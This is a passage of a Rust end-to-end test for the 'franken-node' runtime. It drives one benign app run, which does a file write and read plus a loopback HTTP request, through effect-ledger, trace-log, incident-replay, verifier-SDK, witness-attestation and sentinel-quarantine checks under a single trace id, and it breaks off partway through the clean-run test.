//! bd-f5b04.8.1 — MASTER MOCK-FREE TNR PIPELINE E2E (single trace-id).
//!
//! Walks ONE real operation through every trust-native-runtime layer that is
//! wired into the product today, asserting at each hop that the layers
//! actually compose — no mocks, no stubs, no synthetic verdicts:
//!
//!   L1 RUN      `franken-node run` (subprocess, in-process native engine)
//!               executes a real app doing fs.writeFileSync + fs.readFileSync
//!               + http.get; real bytes hit disk, a real loopback socket
//!               observes the egress, the exit code derives from the real
//!               containment verdict.
//!   L2 EFFECT   Every host crossing lands in the signed host-effect ledger
//!               (`dispatch.host_effect_ledger` in `run --json`): tamper-
//!               evident hash chain, allowed/denied accounting, sha256 head.
//!   L3 LOG      One `--trace-id` correlates the ordered structured-log
//!               event stream (RUN-001 → RUN-003 → FN-EFFECT-002 per host
//!               crossing → RUN-004 on stderr JSONL).
//!   L4 REPLAY   The run's receipts become incident evidence; `incident
//!               bundle --verify` → `incident replay` (matched, thrice-stable
//!               upstream) → `incident counterfactual --policy strict` all
//!               succeed through the real CLI against the same state root.
//!   L5 VSDK     The public verifier SDK re-derives the effect chain OFFLINE
//!               from the ledger entries alone (zero trust in this runtime).
//!   L6 LTV      `franken-node ltv attest` (bd-rgkd2) binds the run's receipt
//!               chain hashes + the sealed bundle into self-contained SDK LTV
//!               evidence (real 2-of-3 Ed25519 witness cosign over a
//!               re-attested root), the product evidence ledger accepts the
//!               cosigned witness receipt, and `ltv verify-as-of` re-derives
//!               the whole claim OFFLINE through the verifier SDK — both CLI
//!               legs run as real subprocesses under the pipeline trace id,
//!               with a fail-closed anti-backdating arm.
//!
//! HONEST SCOPE (verified against source 2026-07-11, bd-f5b04.8.1): the
//! following bead-vision layers are NOT yet reachable from a live `run` and
//! are therefore NOT asserted here — each has a follow-up bead instead of a
//! mock:
//!   * Information-flow labeling IS now wired on the run path (bd-plhag): a
//!     read of a recognized secret file labels its bytes, an egress that
//!     carries those bytes inherits the label, and a denied such egress is a
//!     flow BLOCK the verifier SDK proves as "blocked_before_sink" (asserted
//!     in the exfil variant below). Still open: byte-level PREVENTION of a
//!     secret egress to an SSRF-ALLOWED endpoint (the ledger records+the SDK
//!     detects it, but the runtime does not yet block it — a gate-level
//!     follow-up), following a secret through in-guest transforms (needs
//!     engine-side per-datum lineage), and operator declassification input.
//!   * Bayesian sentinel escalation IS now fed on the run path (bd-bg2hy)
//!     AND drives product-side enforcement (bd-fp1je): the dispatcher derives
//!     canonical observations from the signed ledger (FN-SENTINEL-001),
//!     updates the fixed-point e-process per effect (FN-SENTINEL-002),
//!     selects an expected-loss action (FN-SENTINEL-007), signs an escalation
//!     receipt (FN-SENTINEL-008), and — under a profile whose
//!     `trust.quarantine_on_high_risk` is enabled — writes a durable
//!     content-hash-keyed run-subject quarantine record, risk-bumps the run's
//!     Trusted dependency trust cards, and emits FN-SENTINEL-009; a rerun of
//!     that subject then fails CLOSED at the trust preflight until an audited
//!     `trust release` (L7 below). Still open: fleet-scope action (the run
//!     path is single-node and lacks zone/incident context).
//!   * FN-EFFECT-002 is emitted per ledger entry on the run path (bd-ihtox)
//!     and FN-TTR-001/002 on the incident replay path (bd-x8d9t) — both
//!     pinned by the ordered-event assertions under the pipeline trace id.
//!     FN-EFFECT-001 (receipt STARTED — needs an in-flight emission site
//!     inside the dispatcher) and FN-CAS-* remain registered in
//!     docs/observability/tnr_event_metrics_registry.md but unemitted.
//!
//! Run this lane directly with: `scripts/run_tnr_full_pipeline.sh`

#![cfg(feature = "engine")]

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::Path;
use std::process::{Command, Output};
use std::time::Duration;

use frankenengine_node::control_plane::mmr_proofs::MmrRootWitnessReceipt;
use frankenengine_node::observability::evidence_ledger::{EvidenceLedger, LedgerCapacity};
use frankenengine_node::tools::replay_bundle::{
    EventType, INCIDENT_EVIDENCE_SCHEMA, IncidentEvidenceEvent, IncidentEvidenceMetadata,
    IncidentEvidencePackage, IncidentSeverity,
};
use serde_json::{Value, json};

/// The single trace id that correlates every layer of one pipeline walk.
const CLEAN_TRACE_ID: &str = "tnr-full-pipeline-e2e-clean-7c41";
const EXFIL_TRACE_ID: &str = "tnr-full-pipeline-e2e-exfil-9d02";

/// Path to the binary under test (set by Cargo for integration tests).
fn franken_node_bin() -> &'static str {
    env!("CARGO_BIN_EXE_franken-node")
}

fn layer_pass(layer: &str, detail: &str) {
    println!("[TNR-E2E] {layer:<44} PASS  {detail}");
}

fn run_cli(workspace: &Path, args: &[&str]) -> Output {
    Command::new(franken_node_bin())
        .current_dir(workspace)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `{}`: {err}", args.join(" ")))
}

/// Bootstrap a real operator workspace: `franken-node init` (which
/// synthesizes the fail-closed security defaults), then extend the generated
/// config with the decision-receipt signing key (so `incident bundle` signs
/// bundles) and a loopback allowlist entry (so the guest's http egress to the
/// test sink passes the SSRF gate exactly the way an operator would permit an
/// internal endpoint).
fn bootstrap_workspace(app_src: &str, profile: &str) -> tempfile::TempDir {
    let dir = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(dir.path().join("app.js"), app_src).expect("write fixture app");

    let init = run_cli(
        dir.path(),
        &["init", "--profile", profile, "--out-dir", "."],
    );
    assert!(
        init.status.success(),
        "init must bootstrap the workspace; exit={:?} stderr=\n{}",
        init.status.code(),
        String::from_utf8_lossy(&init.stderr)
    );

    let config_path = dir.path().join("franken_node.toml");
    let mut config = std::fs::read_to_string(&config_path).expect("read init config");
    // Inject the receipt-signing key into the existing [security] section if
    // init generated one; otherwise add the section. Appending a duplicate
    // `[security]` header would be a TOML parse error, hence the split.
    let signing_line = "decision_receipt_signing_key_path = \"keys/receipt-signing.key\"\n";
    if let Some(pos) = config.find("[security]\n") {
        let insert_at = pos + "[security]\n".len();
        config.insert_str(insert_at, signing_line);
    } else {
        config.push_str("\n[security]\n");
        config.push_str(signing_line);
    }
    // init emits an inline `allowlist = []` under [security.network_policy];
    // appending an array-of-tables would redefine the key (TOML error), so
    // replace the inline empty array with the loopback exception in place.
    assert!(
        config.contains("allowlist = []"),
        "init-generated config no longer carries an empty allowlist; \
         update the tnr_full_pipeline_e2e config patch: {config}"
    );
    config = config.replace(
        "allowlist = []",
        "allowlist = [{ host = \"127.0.0.1\", reason = \"tnr full-pipeline e2e: permit the loopback test sink\" }]",
    );
    // bd-fp1je: the legacy-risky profile default is recommend-only (strict/
    // balanced already enforce); force enforcement writes on so the pipeline
    // can assert the sentinel auto-quarantine loop end-to-end regardless of
    // profile.
    assert!(
        config.contains("quarantine_on_high_risk = "),
        "init-generated config no longer serializes trust.quarantine_on_high_risk; \
         update the tnr_full_pipeline_e2e config patch: {config}"
    );
    // legacy-risky serializes `= false`; strict/balanced already `= true`.
    config = config.replace(
        "quarantine_on_high_risk = false",
        "quarantine_on_high_risk = true",
    );
    std::fs::write(&config_path, config).expect("write patched config");

    write_receipt_signing_key(&dir.path().join("keys/receipt-signing.key"));
    dir
}

/// Deterministic test signing key (same convention as incident_cli_e2e):
/// hex-encoded ed25519 seed on disk, matching trust anchor derived below.
fn write_receipt_signing_key(path: &Path) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create key dir");
    }
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x42_u8; 32]);
    std::fs::write(path, hex::encode(signing_key.to_bytes())).expect("write signing key");
}

fn write_replay_trust_anchor(path: &Path) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create key dir");
    }
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x42_u8; 32]);
    std::fs::write(path, hex::encode(signing_key.verifying_key().to_bytes()))
        .expect("write replay trust anchor");
}

struct RunReport {
    exit_code: Option<i32>,
    report: Value,
    stderr: String,
}

/// Drive `franken-node run` as a real subprocess with the pipeline's trace id.
///
/// The pipeline tests run under `legacy-risky` because that is the profile
/// that GRANTS `fs:*` and `net:*` at the engine capability layer, which lets
/// the walk exercise the product-layer SSRF gate as the enforcement boundary
/// (allowed loopback vs denied metadata endpoint) with the ledger as the
/// evidence channel. Under `balanced` the engine capability gate itself
/// refuses `fs:write` with a hard interpreter abort — a DIFFERENT, earlier
/// enforcement arm, pinned separately by
/// `tnr_engine_capability_gate_fails_closed_under_balanced`.
fn run_app(workspace: &Path, trace_id: &str, policy: &str) -> RunReport {
    let output = Command::new(franken_node_bin())
        .current_dir(workspace)
        .args([
            "run",
            "app.js",
            "--policy",
            policy,
            "--runtime",
            "franken-engine",
            // With the `engine` feature the native path runs in-process and
            // the engine binary is a presence gate only (never spawned);
            // pointing it at the binary under test is the established
            // convention (see run_console_exit_e2e.rs).
            "--engine-bin",
            franken_node_bin(),
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ])
        .output()
        .expect("spawn franken-node run");

    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
    let report: Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("run --json stdout must be pure JSON ({err}); stdout:\n{stdout}\nstderr:\n{stderr}")
    });
    RunReport {
        exit_code: output.status.code(),
        report,
        stderr,
    }
}

/// Parse the structured-log JSONL stream from stderr into (event_code,
/// trace_id) pairs, in emission order.
fn structured_events(stderr: &str) -> Vec<(String, String)> {
    stderr
        .lines()
        .filter_map(|line| serde_json::from_str::<Value>(line).ok())
        .filter_map(|value| {
            let code = value.get("event_code")?.as_str()?.to_string();
            let trace = value
                .get("trace_id")
                .and_then(Value::as_str)
                .unwrap_or_default()
                .to_string();
            Some((code, trace))
        })
        .collect()
}

/// Assert `expected` appears as an ordered subsequence of the event stream.
fn assert_event_order(events: &[(String, String)], expected: &[&str], trace_id: &str) {
    let mut cursor = 0;
    for (code, trace) in events {
        assert_eq!(
            trace, trace_id,
            "every structured-log event must carry the pipeline trace id; \
             event {code} carried {trace:?}"
        );
        if cursor < expected.len() && code == expected[cursor] {
            cursor += 1;
        }
    }
    assert_eq!(
        cursor,
        expected.len(),
        "expected ordered event-code subsequence {expected:?}, observed {:?}",
        events
            .iter()
            .map(|(code, _)| code.as_str())
            .collect::<Vec<_>>()
    );
}

/// Synthesize the incident evidence package FROM the real run outputs: one
/// evidence event per signed effect receipt, chained parent→child in ledger
/// order, with the full receipt JSON as the event payload. This is evidence
/// ASSEMBLY (the operator's collection step), not mocking — every payload
/// byte originated in the live run above.
fn write_incident_evidence_from_ledger(
    path: &Path,
    incident_id: &str,
    trace_id: &str,
    ledger: &Value,
) -> usize {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create evidence dir");
    }
    let entries = ledger["entries"].as_array().expect("ledger entries array");
    assert!(
        !entries.is_empty(),
        "ledger must carry at least one receipt"
    );

    let mut events = Vec::with_capacity(entries.len());
    let mut refs = Vec::with_capacity(entries.len());
    for (idx, entry) in entries.iter().enumerate() {
        let event_id = format!("evt-{:03}", idx + 1);
        let reference = format!("refs/effects/{event_id}.json");
        events.push(IncidentEvidenceEvent {
            event_id: event_id.clone(),
            timestamp: format!("2026-07-11T10:00:{:02}.000000Z", idx.min(59)),
            event_type: EventType::PolicyEval,
            payload: json!({
                "effect_receipt_chain_entry": entry,
                "chain_hash": entry["chain_hash"],
            }),
            provenance_ref: reference.clone(),
            parent_event_id: idx.checked_sub(1).map(|p| format!("evt-{:03}", p + 1)),
            state_snapshot: None,
            policy_version: None,
        });
        refs.push(reference);
    }

    let package = IncidentEvidencePackage {
        schema_version: INCIDENT_EVIDENCE_SCHEMA.to_string(),
        incident_id: incident_id.to_string(),
        collected_at: "2026-07-11T10:05:00.000000Z".to_string(),
        trace_id: trace_id.to_string(),
        severity: IncidentSeverity::High,
        incident_type: "security".to_string(),
        detector: "tnr-full-pipeline-e2e".to_string(),
        policy_version: "legacy-risky".to_string(),
        initial_state_snapshot: json!({
            "chain_head_hash": ledger["chain_head_hash"],
            "effect_count": ledger["effect_count"],
            "allowed_count": ledger["allowed_count"],
            "denied_count": ledger["denied_count"],
        }),
        events,
        evidence_refs: refs,
        metadata: IncidentEvidenceMetadata {
            title: "TNR full-pipeline e2e evidence assembled from live run receipts".to_string(),
            affected_components: vec!["host-effect-bridge".to_string()],
            tags: vec!["tnr".to_string(), "e2e".to_string()],
        },
    };
    std::fs::write(
        path,
        serde_json::to_string_pretty(&package).expect("serialize evidence package"),
    )
    .expect("write evidence package");
    entries.len()
}

fn parse_replay_result(stderr: &str) -> (bool, usize) {
    let line = stderr
        .lines()
        .find(|line| line.starts_with("incident replay result:"))
        .unwrap_or_else(|| panic!("missing replay result line in stderr:\n{stderr}"));
    let mut matched = None;
    let mut event_count = None;
    for token in line.split_whitespace() {
        if let Some(value) = token.strip_prefix("matched=") {
            matched = Some(value == "true");
        }
        if let Some(value) = token.strip_prefix("event_count=") {
            event_count = Some(value.parse::<usize>().expect("event_count"));
        }
    }
    (
        matched.expect("matched field"),
        event_count.expect("event_count field"),
    )
}

/// Drive the incident CLI chain (bundle --verify → replay → counterfactual
/// --policy strict) over evidence assembled from the run's ledger, returning
/// the bundle's integrity hash for the LTV leg.
fn incident_chain_leg(
    workspace: &Path,
    incident_id: &str,
    trace_id: &str,
    ledger: &Value,
) -> String {
    let evidence_path = workspace
        .join("fixtures/incidents")
        .join(incident_id)
        .join("evidence.v1.json");
    let event_count =
        write_incident_evidence_from_ledger(&evidence_path, incident_id, trace_id, ledger);
    let evidence_arg = evidence_path.to_string_lossy().to_string();

    let bundle_output = run_cli(
        workspace,
        &[
            "incident",
            "bundle",
            "--id",
            incident_id,
            "--evidence-path",
            &evidence_arg,
            "--verify",
        ],
    );
    assert!(
        bundle_output.status.success(),
        "incident bundle failed: {}",
        String::from_utf8_lossy(&bundle_output.stderr)
    );
    let bundle_stderr = String::from_utf8_lossy(&bundle_output.stderr);
    assert!(
        bundle_stderr.contains("bundle integrity: valid"),
        "bundle must self-verify: {bundle_stderr}"
    );
    layer_pass(
        "L4 REPLAY incident bundle --verify",
        &format!("{event_count} receipt-events sealed into {incident_id}.fnbundle"),
    );

    let trust_anchor_path = workspace.join("keys/replay-trust-anchor.pub");
    write_replay_trust_anchor(&trust_anchor_path);
    let trust_anchor_arg = trust_anchor_path.to_string_lossy().to_string();
    let bundle_file = format!("{incident_id}.fnbundle");

    let replay_output = run_cli(
        workspace,
        &[
            "incident",
            "replay",
            "--bundle",
            &bundle_file,
            "--trusted-public-key",
            &trust_anchor_arg,
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        replay_output.status.success(),
        "incident replay failed: {}",
        String::from_utf8_lossy(&replay_output.stderr)
    );
    let replay_stderr = String::from_utf8_lossy(&replay_output.stderr).into_owned();
    let (matched, replayed_events) = parse_replay_result(&replay_stderr);
    assert!(matched, "replay must re-derive the recorded sequence");
    assert_eq!(
        replayed_events, event_count,
        "replay must cover every receipt-event"
    );
    // bd-x8d9t: the replay lifecycle surfaces as registered FN-TTR events
    // under the SAME trace id as the run that produced the receipts —
    // cross-command trace continuity for the whole pipeline.
    let replay_events = structured_events(&replay_stderr);
    assert_event_order(&replay_events, &["FN-TTR-001", "FN-TTR-002"], trace_id);
    layer_pass(
        "L4 REPLAY incident replay",
        &format!("matched=true event_count={replayed_events} FN-TTR-001→002 on trace"),
    );

    let counterfactual_output = run_cli(
        workspace,
        &[
            "incident",
            "counterfactual",
            "--bundle",
            &bundle_file,
            "--trusted-public-key",
            &trust_anchor_arg,
            "--policy",
            "strict",
            "--json",
        ],
    );
    assert!(
        counterfactual_output.status.success(),
        "incident counterfactual failed: {}",
        String::from_utf8_lossy(&counterfactual_output.stderr)
    );
    let counterfactual_stdout = String::from_utf8_lossy(&counterfactual_output.stdout);
    let counterfactual: Value =
        serde_json::from_str(counterfactual_stdout.trim()).unwrap_or_else(|err| {
            panic!("counterfactual --json must emit JSON ({err}):\n{counterfactual_stdout}")
        });
    assert_eq!(
        counterfactual["schema_version"],
        json!("franken-node/incident-counterfactual-report/v2"),
        "counterfactual report schema pin"
    );
    let total_decisions = counterfactual["total_decisions"]
        .as_u64()
        .expect("total_decisions");
    assert_eq!(
        total_decisions as usize, event_count,
        "counterfactual must re-evaluate every recorded decision"
    );
    layer_pass(
        "L4 REPLAY incident counterfactual --policy strict",
        &format!(
            "total_decisions={total_decisions} changed_decisions={} severity_delta={}",
            counterfactual["changed_decisions"], counterfactual["severity_delta"]
        ),
    );

    // Extract the sealed bundle's integrity hash so the LTV leg can bind the
    // replay artifact into the long-term log alongside the effect chain.
    let bundle_json: Value = serde_json::from_str(
        &std::fs::read_to_string(workspace.join(&bundle_file)).expect("read bundle"),
    )
    .expect("bundle is canonical JSON");
    bundle_json["integrity_hash"]
        .as_str()
        .expect("bundle integrity_hash")
        .to_string()
}

/// Offline verifier-SDK leg: re-derive the effect chain from the `run --json`
/// ledger entries alone — the exact surface an external auditor consumes.
fn verifier_sdk_leg(ledger: &Value) -> String {
    let entries_json = serde_json::to_string(&ledger["entries"]).expect("serialize entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the effect chain offline");
    let ledger_head = ledger["chain_head_hash"].as_str().expect("chain head");
    assert_eq!(
        verdict.head_chain_hash, ledger_head,
        "offline re-derived head must match the runtime's chain head"
    );
    assert_eq!(
        verdict.effect_count as u64,
        ledger["effect_count"].as_u64().unwrap()
    );
    layer_pass(
        "L5 VSDK offline effect-chain re-derivation",
        &format!("head={}…", &ledger_head[..24.min(ledger_head.len())]),
    );
    ledger_head.to_string()
}

fn witness_signing_key(index: u8) -> ed25519_dalek::SigningKey {
    // Deterministic distinct seeds for the 3 independent witnesses.
    ed25519_dalek::SigningKey::from_bytes(&[0x51 + index; 32])
}

/// CLI LTV leg (bd-rgkd2): `ltv attest` binds the run's signed effect chain
/// hashes + the sealed bundle into self-contained SDK LTV evidence, cosigned
/// by a real 2-of-3 Ed25519 witness threshold over a re-attested root; the
/// product evidence ledger accepts the cosigned witness receipt off the CLI
/// wire shape; `ltv verify-as-of` re-derives the whole claim OFFLINE through
/// the verifier SDK; a backdated as-of fails closed with FN-LTV-ERR-001.
fn ltv_leg(
    workspace: &Path,
    run_report: &Value,
    bundle_file: &str,
    bundle_integrity_hash: &str,
    trace_id: &str,
) {
    std::fs::write(
        workspace.join("run-report.json"),
        serde_json::to_string(run_report).expect("serialize run report"),
    )
    .expect("persist run report for ltv attest");
    for index in 0..3_u8 {
        let key_path = workspace.join(format!("keys/ltv-witness-{index}.key"));
        std::fs::create_dir_all(key_path.parent().expect("key parent")).expect("key dir");
        std::fs::write(
            &key_path,
            hex::encode(witness_signing_key(index).to_bytes()),
        )
        .expect("write witness key");
    }

    let attest_output = run_cli(
        workspace,
        &[
            "ltv",
            "attest",
            "--bundle",
            bundle_file,
            "--trusted-public-key",
            "keys/replay-trust-anchor.pub",
            "--run-report",
            "run-report.json",
            "--witness-key",
            "keys/ltv-witness-0.key",
            "--witness-key",
            "keys/ltv-witness-1.key",
            "--witness-key",
            "keys/ltv-witness-2.key",
            "--witness-threshold",
            "2",
            "--witness-group-id",
            "tnr-e2e-witnesses",
            "--witness-policy-id",
            "ltv-policy-v1",
            "--out",
            "ltv-evidence.json",
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        attest_output.status.success(),
        "ltv attest failed: {}",
        String::from_utf8_lossy(&attest_output.stderr)
    );
    let attest_stderr = String::from_utf8_lossy(&attest_output.stderr).into_owned();
    let attest_events = structured_events(&attest_stderr);
    assert_event_order(&attest_events, &["FN-LTV-002", "FN-LTV-001"], trace_id);
    let attest_stdout = String::from_utf8_lossy(&attest_output.stdout);
    let attest: Value = serde_json::from_str(attest_stdout.trim())
        .unwrap_or_else(|err| panic!("ltv attest --json must emit JSON ({err}):\n{attest_stdout}"));
    assert_eq!(
        attest["schema_version"],
        json!("franken-node/ltv-attest-cli/v1")
    );
    assert_eq!(
        attest["artifact_hash"],
        json!(bundle_integrity_hash),
        "the attested artifact must be the sealed bundle"
    );
    let ledger_entry_count = run_report["dispatch"]["host_effect_ledger"]["entries"]
        .as_array()
        .expect("ledger entries")
        .len() as u64;
    assert_eq!(
        attest["origin_tree_size"],
        json!(ledger_entry_count + 1),
        "origin tree must commit the bundle marker plus every effect chain hash"
    );
    assert_eq!(attest["witnesses"], json!(3));
    assert_eq!(attest["witness_threshold"], json!(2));
    layer_pass(
        "L6 LTV attest (CLI, chain+bundle leaves)",
        &format!(
            "origin_tree_size={} witnesses=3/2 FN-LTV-002→001 on trace",
            attest["origin_tree_size"]
        ),
    );

    // The CLI evidence's cosigned witness receipt is wire-compatible with the
    // product evidence ledger's proof-of-anteriority consumer.
    let evidence_json: Value = serde_json::from_str(
        &std::fs::read_to_string(workspace.join("ltv-evidence.json")).expect("read ltv evidence"),
    )
    .expect("ltv evidence is canonical JSON");
    let receipt: MmrRootWitnessReceipt =
        serde_json::from_value(evidence_json["witness_receipt"].clone())
            .expect("CLI witness receipt must deserialize as the product receipt type");
    let as_of = evidence_json["as_of_unix_seconds"].as_u64().expect("as_of");
    let mut evidence_ledger = EvidenceLedger::new(LedgerCapacity::new(16, 1 << 20));
    let (_, verification) = evidence_ledger
        .append_mmr_root_witness_receipt(&receipt, as_of + 1)
        .expect("witness receipt appends as proof-of-anteriority evidence");
    assert!(verification.valid_signatures >= 2);
    layer_pass(
        "L6 LTV witness receipt → evidence ledger",
        &format!(
            "valid_signatures={}/{} observed_at<=as_of",
            verification.valid_signatures, verification.threshold
        ),
    );

    let verify_output = run_cli(
        workspace,
        &[
            "ltv",
            "verify-as-of",
            "--evidence",
            "ltv-evidence.json",
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        verify_output.status.success(),
        "ltv verify-as-of failed: {}",
        String::from_utf8_lossy(&verify_output.stderr)
    );
    let verify_stderr = String::from_utf8_lossy(&verify_output.stderr).into_owned();
    let verify_events = structured_events(&verify_stderr);
    assert_event_order(&verify_events, &["FN-LTV-003"], trace_id);
    let verify_stdout = String::from_utf8_lossy(&verify_output.stdout);
    let verdict: Value = serde_json::from_str(verify_stdout.trim()).unwrap_or_else(|err| {
        panic!("ltv verify-as-of --json must emit JSON ({err}):\n{verify_stdout}")
    });
    assert_eq!(
        verdict["schema_version"],
        json!("franken-node/ltv-verify-as-of-cli/v1")
    );
    assert_eq!(verdict["verdict"], json!("Pass"));
    assert!(
        verdict["sdk_transcript"]
            .as_array()
            .expect("sdk transcript")
            .iter()
            .any(|event| event["event_code"] == json!("FN_LTV_WITNESS_ANTERIORITY_PROVEN")),
        "offline SDK transcript must prove witness anteriority: {verdict}"
    );
    layer_pass(
        "L6 LTV verify-as-of (offline SDK via CLI)",
        "verdict=Pass anteriority proven FN-LTV-003 on trace",
    );

    // Anti-backdating arm: an as-of before the witness observation must fail
    // closed with the registered error event.
    let backdated_output = run_cli(
        workspace,
        &[
            "ltv",
            "verify-as-of",
            "--evidence",
            "ltv-evidence.json",
            "--as-of",
            "1000",
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        !backdated_output.status.success(),
        "backdated as-of must fail closed"
    );
    let backdated_stderr = String::from_utf8_lossy(&backdated_output.stderr);
    assert!(
        backdated_stderr.contains("FN-LTV-ERR-001"),
        "backdated verify must emit FN-LTV-ERR-001: {backdated_stderr}"
    );
    layer_pass(
        "L6 LTV anti-backdating (as-of=1000)",
        "exit!=0 FN-LTV-ERR-001 emitted",
    );
}

/// bd-fp1je enforcement loop: the escalating run wrote a durable sentinel
/// quarantine record and emitted FN-SENTINEL-009; a rerun of the same app
/// fails CLOSED at the trust preflight naming the release command;
/// `trust release` lifts it with an audited operator entry; the subject then
/// runs again and re-quarantines (released records never mask new
/// escalations).
fn sentinel_enforcement_leg(workspace: &Path, run: &RunReport, trace_id: &str) {
    let enforcement = &run.report["receipt"]["sentinel_enforcement"];
    assert_eq!(
        enforcement["mode"],
        json!("enforced"),
        "escalated run must enforce under quarantine_on_high_risk=true: {enforcement}"
    );
    let decision_id = run.report["dispatch"]["sentinel"]["decision"]["decision_id"]
        .as_str()
        .expect("sentinel decision id")
        .to_string();
    assert_eq!(enforcement["decision_id"], json!(&decision_id));
    let record_path_str = enforcement["quarantine_record_path"]
        .as_str()
        .expect("quarantine record path");
    let record_path = {
        let path = Path::new(record_path_str);
        if path.is_absolute() {
            path.to_path_buf()
        } else {
            workspace.join(path)
        }
    };
    let record: Value = serde_json::from_str(
        &std::fs::read_to_string(&record_path).expect("read sentinel quarantine record"),
    )
    .expect("sentinel quarantine record is canonical JSON");
    assert_eq!(
        record["schema_version"],
        json!("franken-node/sentinel-quarantine-record/v1")
    );
    assert_eq!(record["released"], json!(false));
    assert_eq!(record["decision_id"], json!(&decision_id));
    assert!(
        record["escalation_receipt"].is_object(),
        "record must embed the signed FN-SENTINEL-008 escalation receipt"
    );
    let run_events = structured_events(&run.stderr);
    assert_event_order(
        &run_events,
        &["FN-SENTINEL-008", "FN-SENTINEL-009"],
        trace_id,
    );
    layer_pass(
        "L7 ENFORCE escalation → subject quarantine record",
        &format!("decision={decision_id} FN-SENTINEL-009 on trace"),
    );

    // Fail-closed rerun: the preflight refuses the quarantined subject in
    // every policy mode and names the exact release command.
    let blocked = Command::new(franken_node_bin())
        .current_dir(workspace)
        .args([
            "run",
            "app.js",
            "--policy",
            "legacy-risky",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
            "--json",
            "--trace-id",
            trace_id,
        ])
        .output()
        .expect("spawn blocked rerun");
    assert!(
        !blocked.status.success(),
        "rerun of a sentinel-quarantined app must fail closed; stdout:\n{}",
        String::from_utf8_lossy(&blocked.stdout)
    );
    let blocked_stderr = String::from_utf8_lossy(&blocked.stderr);
    assert!(
        blocked_stderr.contains("quarantined by the Runtime Sentinel"),
        "block reason must name the sentinel quarantine: {blocked_stderr}"
    );
    assert!(
        blocked_stderr.contains("trust release"),
        "block reason must name the release command: {blocked_stderr}"
    );
    layer_pass(
        "L7 ENFORCE rerun blocked at preflight",
        "exit!=0, reason names sentinel quarantine + release command",
    );

    // Audited operator release, then the subject runs again.
    let release = run_cli(
        workspace,
        &[
            "trust",
            "release",
            "--app",
            "app.js",
            "--operator-id",
            "tnr-e2e-operator",
            "--reason",
            "containment remediated in e2e",
            "--json",
        ],
    );
    assert!(
        release.status.success(),
        "trust release failed: {}",
        String::from_utf8_lossy(&release.stderr)
    );
    let release_stdout = String::from_utf8_lossy(&release.stdout);
    let release_json: Value = serde_json::from_str(release_stdout.trim()).unwrap_or_else(|err| {
        panic!("trust release --json must emit JSON ({err}):\n{release_stdout}")
    });
    assert_eq!(
        release_json["schema_version"],
        json!("franken-node/trust-release-cli/v1")
    );
    assert_eq!(release_json["decision_id"], json!(&decision_id));
    let released: Value =
        serde_json::from_str(&std::fs::read_to_string(&record_path).expect("re-read record"))
            .expect("released record is canonical JSON");
    assert_eq!(released["released"], json!(true));
    assert_eq!(released["release_operator"], json!("tnr-e2e-operator"));
    layer_pass(
        "L7 ENFORCE trust release lifts quarantine",
        "released=true with audited operator entry",
    );

    let rerun = run_app(workspace, trace_id, "legacy-risky");
    assert_eq!(
        rerun.exit_code,
        Some(0),
        "released subject must run again; stderr:\n{}",
        rerun.stderr
    );
    let rerun_enforcement = &rerun.report["receipt"]["sentinel_enforcement"];
    assert_eq!(rerun_enforcement["mode"], json!("enforced"));
    assert_eq!(
        rerun_enforcement["quarantine_record_preexisting"],
        json!(false),
        "a released record must be superseded by a fresh quarantine, not reused"
    );
    let requarantined: Value = serde_json::from_str(
        &std::fs::read_to_string(&record_path).expect("re-read record after rerun"),
    )
    .expect("re-quarantined record is canonical JSON");
    assert_eq!(requarantined["released"], json!(false));
    layer_pass(
        "L7 ENFORCE re-escalation re-quarantines after release",
        "record active again with fresh decision",
    );
}

/// The clean pipeline: fs write + fs read + allowed loopback http egress,
/// every layer green, all under one trace id.
#[test]
fn tnr_full_pipeline_clean_run_single_trace_id() {
    // A real loopback sink observes the guest's egress (bound before the run
    // so the connect always finds it listening).
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(10)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(
            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
        );
        let _ = stream.flush();
        received
    });

    let app = format!(
        "const fs = require('fs');\n\
         fs.writeFileSync('out.txt', 'tnr-pipeline-payload');\n\
         const data = fs.readFileSync('out.txt');\n\
         console.log('tnr-payload-bytes', data.length);\n\
         require('http').get('http://{addr}/');\n"
    );
    let workspace = bootstrap_workspace(&app, "legacy-risky");
    let run = run_app(workspace.path(), CLEAN_TRACE_ID, "legacy-risky");

    // ---- L1 RUN: real execution, real side effects, verdict-derived exit.
    assert_eq!(
        run.exit_code,
        Some(0),
        "clean run must exit 0 (containment Allow); stderr:\n{}",
        run.stderr
    );
    assert_eq!(run.report["success"], json!(true));
    assert_eq!(run.report["dispatch"]["exit_code"], json!(0));
    let written = std::fs::read_to_string(workspace.path().join("out.txt"))
        .expect("guest fs.writeFileSync must produce real bytes on disk");
